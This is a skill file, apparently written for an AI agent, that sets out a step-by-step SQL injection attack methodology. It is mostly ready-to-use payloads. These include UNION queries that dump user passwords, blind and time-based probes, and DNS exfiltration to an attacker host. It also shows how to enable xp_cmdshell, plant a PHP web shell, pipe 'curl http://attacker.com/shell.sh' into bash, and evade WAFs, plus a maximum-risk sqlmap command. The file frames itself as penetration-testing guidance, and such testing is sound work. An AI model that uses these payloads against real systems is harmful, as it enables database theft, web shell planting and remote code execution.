---
name: sqli
description: SQL injection expert methodology covering UNION-based, blind (boolean/time), error-based, and second-order injection. Includes WAF bypass, out-of-band exfiltration, and post-exploitation DB pivoting.
version: 1.0.0
license: Apache-2.0
---

# SQL Injection

## Attack Surface

Any user-controlled value that reaches a SQL query without parameterisation: form fields, URL parameters, HTTP headers (User-Agent, Referer, X-Forwarded-For, Cookie), JSON/XML body fields, search boxes, sort/order parameters, GraphQL variables.

## Methodology

### Phase 1 — Detection

Test all injection points with:

```
'           -- error-based detection
''          -- escaped quote (normalised input)
`           -- MySQL backtick
')          -- close parenthesis
1' OR '1'='1
1 AND 1=1
1 AND 1=2  -- compare responses for boolean blind
1; SELECT SLEEP(5)--  -- time-based blind
```

Observe: HTTP status changes, response length diffs, error messages, timing differences.

### Phase 2 — Classification

| Injection type | Indicator |
|---|---|
| Error-based | DB error message in response |
| UNION-based | Response reflects query output |
| Boolean blind | Binary response difference (login/no login, 200/500) |
| Time-based blind | Response delay on `SLEEP()`/`WAITFOR DELAY` |
| Out-of-band | DNS/HTTP callback from DB server |
| Second-order | Stored, triggered on later retrieval |

### Phase 3 — Exploitation

**UNION-based (enumerate columns first):**
```sql
1 ORDER BY 1--    -- increment until error to find column count
1 UNION SELECT NULL,NULL,NULL--
1 UNION SELECT 1,version(),database()--
1 UNION SELECT 1,table_name,3 FROM information_schema.tables--
1 UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--
1 UNION SELECT 1,username,password FROM users--
```

**Boolean blind (Burp Intruder / manual):**
```sql
1 AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
```

**Time-based blind:**
```sql
-- MySQL
1 AND SLEEP(5)--
1 AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)--
-- MSSQL
1; WAITFOR DELAY '0:0:5'--
-- PostgreSQL
1; SELECT pg_sleep(5)--
```

**Out-of-band (DNS exfiltration — MSSQL):**
```sql
1; EXEC master..xp_dirtree '//attacker.burpcollaborator.net/a'--
```

### Phase 4 — Database enumeration

```sql
-- MySQL
SELECT version(), user(), database()
SELECT schema_name FROM information_schema.schemata
SELECT table_name FROM information_schema.tables WHERE table_schema=database()
SELECT column_name FROM information_schema.columns WHERE table_name='target'

-- MSSQL
SELECT @@version, SYSTEM_USER, DB_NAME()
SELECT name FROM master..sysdatabases
SELECT name FROM sysobjects WHERE xtype='U'

-- PostgreSQL
SELECT version(), current_user, current_database()
SELECT table_name FROM information_schema.tables WHERE table_schema='public'
```

### Phase 5 — Post-exploitation

**MSSQL xp_cmdshell:**
```sql
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

**MySQL file read/write:**
```sql
SELECT LOAD_FILE('/etc/passwd')
SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/shell.php'
```

**PostgreSQL COPY:**
```sql
COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/shell.sh | bash'
```

## WAF Bypass Techniques

- Case variation: `sElEcT`
- Comment insertion: `SE/**/LECT`
- URL encoding: `%55NION`
- Double URL encoding: `%2555NION`
- Inline comments: `/*!UNION*/`
- Whitespace substitution: `%09` (tab), `%0a` (newline)
- Keyword alternatives: `||` instead of `OR`, `&&` instead of `AND`

## Tools

- sqlmap: `sqlmap -u "http://target/page?id=1" --dbs --level=5 --risk=3`
- Burp Suite Pro — scanner + manual testing
- Havij (legacy), jSQL Injection
- Manual Python with requests for custom detection

## OWASP Top 10 Mapping

- A03:2021 — Injection

## Notes

Always use `--risk=3 --level=5` in sqlmap only with explicit authorization. Heavy sqlmap scans can cause denial of service on fragile databases.
